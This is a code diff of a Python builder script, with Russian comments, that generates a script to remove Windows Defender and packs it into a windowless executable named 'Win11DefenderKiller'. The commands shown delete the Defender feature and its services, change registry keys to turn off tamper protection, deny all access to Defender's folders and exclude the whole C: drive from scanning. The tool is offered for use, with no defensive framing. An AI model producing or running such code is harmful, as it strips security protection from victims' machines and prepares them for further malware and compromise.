@@ -29,72 +29,89 @@ if not run_as_admin():
 
 time.sleep(2)
 
-# Команды для Windows 11
-commands = [
-    # Отключаем Tamper Protection через разные методы
-    'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
-    'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f',
+def disable_defender_completely():
+    # 1. УДАЛЯЕМ ЗАЩИТНИКА Через DISM
+    dism_commands = [
+        'dism /online /disable-feature /featurename:Windows-Defender /Remove /NoRestart',
+        'dism /online /disable-feature /featurename:Windows-Defender-GUI /NoRestart'
+    ]
     
-    # Основные политики отключения
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f',
+    # 2. БЛОКИРУЕМ ДОСТУП К ФАЙЛАМ ЗАЩИТНИКА
+    block_commands = [
+        'takeown /f "C:\\\\Program Files\\\\Windows Defender" /r /d y',
+        'icacls "C:\\\\Program Files\\\\Windows Defender" /deny Everyone:F /t',
+        'takeown /f "C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender" /r /d y', 
+        'icacls "C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender" /deny Everyone:F /t'
+    ]
     
-    # Реальная защита в реальном времени
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f',
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f',
+    # 3. РЕЕСТР - ПОЛНОЕ ОТКЛЮЧЕНИЕ
+    registry_commands = [
+        # Полное отключение через политики
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0 /f',
+        
+        # Отключаем Tamper Protection
+        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f',
+        'reg add "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f',
+        
+        # УДАЛЯЕМ службы из реестра
+        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend" /f',
+        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WdNisSvc" /f',
+        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SecurityHealthService" /f',
+        'reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WdNisDrv" /f'
+    ]
     
-    # Центр безопасности Windows 11
-    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center" /v "DisableVirusUI" /t REG_DWORD /d 1 /f',
+    # 4. СЛУЖБЫ - ОСТАНАВЛИВАЕМ И УДАЛЯЕМ
+    service_commands = [
+        'sc stop WinDefend',
+        'sc delete WinDefend',
+        'sc stop WdNisSvc', 
+        'sc delete WdNisSvc',
+        'sc stop SecurityHealthService',
+        'sc delete SecurityHealthService'
+    ]
     
-    # Службы Windows 11
-    'sc stop WinDefend',
-    'sc config WinDefend start= disabled',
-    'sc stop WdNisSvc',
-    'sc config WdNisSvc start= disabled',
-    'sc stop SecurityHealthService',
-    'sc config SecurityHealthService start= disabled',
-    'sc stop WdNisDrv',
-    'sc config WdNisDrv start= disabled',
+    # Выполняем все команды
+    for cmd in dism_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(1)
     
-    # Обновляем политики
-    'gpupdate /force'
-]
-
-# Выполняем команды
-for cmd in commands:
-    try:
+    for cmd in block_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(1)
+    
+    for cmd in registry_commands:
         subprocess.run(cmd, shell=True, capture_output=True)
         time.sleep(0.5)
-    except:
-        pass
-
-# PowerShell команды для Windows 11
-ps_commands = [
-    "Set-MpPreference -DisableRealtimeMonitoring $true",
-    "Set-MpPreference -DisableBehaviorMonitoring $true",
-    "Set-MpPreference -DisableBlockAtFirstSeen $true",
-    "Set-MpPreference -DisableIOAVProtection $true",
-    "Set-MpPreference -PUAProtection disable",
-    "Set-MpPreference -MAPSReporting 0",
-    "Set-MpPreference -SubmitSamplesConsent 2"
-]
-
-for cmd in ps_commands:
-    try:
+    
+    for cmd in service_commands:
+        subprocess.run(cmd, shell=True, capture_output=True)
+        time.sleep(0.5)
+    
+    # 5. PowerShell - ФИНАЛЬНОЕ ОТКЛЮЧЕНИЕ
+    ps_commands = [
+        "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "Set-MpPreference -DisableBehaviorMonitoring $true",
+        "Set-MpPreference -DisableBlockAtFirstSeen $true",
+        "Set-MpPreference -DisableIOAVProtection $true",
+        "Remove-MpPreference -ExclusionPath",
+        "Add-MpPreference -ExclusionPath 'C:\\\\'"
+    ]
+    
+    for cmd in ps_commands:
         subprocess.run(["powershell", "-Command", cmd], capture_output=True)
         time.sleep(0.5)
-    except:
-        pass
+
+disable_defender_completely()
 '''
 
-    with open('win11_defender_disable.py', 'w', encoding='utf-8') as f:
+    with open('win11_defender_kill.py', 'w', encoding='utf-8') as f:
         f.write(win11_code)
 
 def compile_to_exe():
-    os.system('pyinstaller --onefile --noconsole --name "Win11DefenderDisable" win11_defender_disable.py')
-    print("EXE создан: Win11DefenderDisable.exe")
+    os.system('pyinstaller --onefile --noconsole --name "Win11DefenderKiller" win11_defender_kill.py')
+    print("EXE создан: Win11DefenderKiller.exe")
 
 if __name__ == "__main__":
     install_pyinstaller()
